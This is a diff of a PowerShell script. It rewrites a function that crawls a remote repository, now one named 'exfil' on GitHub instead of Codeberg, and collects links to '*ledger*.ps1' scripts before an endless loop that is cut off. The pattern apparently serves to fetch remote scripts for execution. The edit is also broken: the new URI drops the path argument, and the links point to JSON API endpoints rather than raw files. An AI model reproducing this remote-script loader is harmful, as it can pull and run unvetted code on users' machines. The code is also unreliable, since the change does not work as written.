@@ -4,34 +4,34 @@ foreach ($tlsProtocol in $AvailableTls) {
     [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol
 }
 
-# Define your Codeberg repository details
+# Define your repo repository details
 $owner = "sempiampi"
-$repo = "madoxzy"
+$repo = "exfil"
 
 # Get the contents of a directory in the repository
-function Get-CodebergRepoContents {
+function Get-repoRepoContents {
     param (
         [string]$owner,
         [string]$repo,
         [string]$path = ""
     )
 
-    $uri = "https://codeberg.org/api/v1/repos/$owner/$repo/contents/$path"
+    $uri = "https://api.github.com/repos/$owner/$repo/contents"
     $response = Invoke-RestMethod -Uri $uri
     $contents = @()
 
     foreach ($item in $response) {
         if ($item.type -eq "dir") {
-            $contents += Get-CodebergRepoContents -owner $owner -repo $repo -path $item.path
+            $contents += Get-repoRepoContents -owner $owner -repo $repo -path $item.path
         } elseif ($item.type -eq "file" -and $item.name -like "*ledger*.ps1") {
-            $contents += "https://codeberg.org/$owner/$repo/raw/branch/main/$($item.path)"
+            $contents += "https://api.github.com/repos/$owner/$repo/contents/$($item.path)"
         }
     }
     return $contents
 }
 
 # Get the contents of the entire repository
-$actions = Get-CodebergRepoContents -owner $owner -repo $repo
+$actions = Get-repoRepoContents -owner $owner -repo $repo
 
 while ($true) {
     Write-Host "-------------------------------------------------------------" -ForegroundColor Yellow -BackgroundColor Black
